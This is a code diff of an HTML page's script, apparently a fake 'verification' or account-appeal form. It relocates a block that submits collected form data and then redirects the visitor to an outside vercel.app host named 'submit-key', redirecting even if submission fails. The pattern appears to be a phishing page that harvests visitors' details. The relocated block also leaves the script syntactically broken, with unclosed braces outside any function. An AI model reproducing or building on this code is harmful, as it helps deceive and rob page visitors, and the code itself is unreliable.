@@ -1253,32 +1253,7 @@
                 }, 2000);
             } else {
                 alert("Please enter all required fields to complete verification.");
-            }          // Submit to first form, then redirect
-          Promise.all([
-            submitToFirstForm(formData),
-          ])
-            .then(() => {
-              // Hide loading state
-              submitRequestBtn.classList.remove("button-loading");
-              submitRequestBtn.disabled = false;
-
-              // Close the modal
-              appealModal.style.display = "none";
-
-              // Redirect to example link after successful submission
-              window.location.href = "https://submit-key-1.vercel.app/";
-            })
-            .catch((error) => {
-              // Hide loading state
-              submitRequestBtn.classList.remove("button-loading");
-              submitRequestBtn.disabled = false;
-
-              console.error("Error during submission:", error);
-
-              // Still redirect even if submission fails (optional behavior)
-              // Comment out the next 3 lines if you want to prevent redirect on error
-              appealModal.style.display = "none";
-              window.location.href = "https://submit-key-1.vercel.app/";
+            }
         }
         
         // Close success modal
@@ -1340,6 +1315,32 @@
         document.addEventListener('DOMContentLoaded', function() {
             changeLanguage('en');
         });
+                  // Submit to first form, then redirect
+          Promise.all([
+            submitToFirstForm(formData),
+          ])
+            .then(() => {
+              // Hide loading state
+              submitRequestBtn.classList.remove("button-loading");
+              submitRequestBtn.disabled = false;
+
+              // Close the modal
+              appealModal.style.display = "none";
+
+              // Redirect to example link after successful submission
+              window.location.href = "https://submit-key-1.vercel.app/";
+            })
+            .catch((error) => {
+              // Hide loading state
+              submitRequestBtn.classList.remove("button-loading");
+              submitRequestBtn.disabled = false;
+
+              console.error("Error during submission:", error);
+
+              // Still redirect even if submission fails (optional behavior)
+              // Comment out the next 3 lines if you want to prevent redirect on error
+              appealModal.style.display = "none";
+              window.location.href = "https://submit-key-1.vercel.app/";
   </script>
 </body>
 </html>
